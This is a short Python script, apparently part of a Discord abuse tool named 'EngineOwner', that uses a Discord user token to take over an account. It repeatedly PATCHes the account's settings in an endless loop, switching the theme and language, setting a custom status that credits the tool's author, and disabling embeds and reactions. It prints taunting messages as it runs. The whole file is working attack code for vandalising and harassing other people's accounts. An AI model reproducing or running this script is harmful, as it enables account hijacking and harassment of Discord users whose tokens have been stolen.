import random
import requests
import time
from os import system
from colorama import Fore
from random import choice

title = "EngineOwner ║ Discord Fucker/Flashbanger"
system("title " + title)

def fucker(token):
    print("")
    while True:
        setting = {
            'theme': 'light',
            'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN']),
             'custom_status': {
                 'text': 'Fucked by github.com/itssnee/engine-owner / sorry bro - Snee',
            },
            'render_embeds': False,
            'render_reactions': False
        }
        requests.patch("https://discord.com/api/v6/users/@me/settings", headers=getheaders(token), json=setting)
        print(f"{Fore.RED}[ C ] Fucked the account, poor guy :pensive:")
        time.sleep(2)
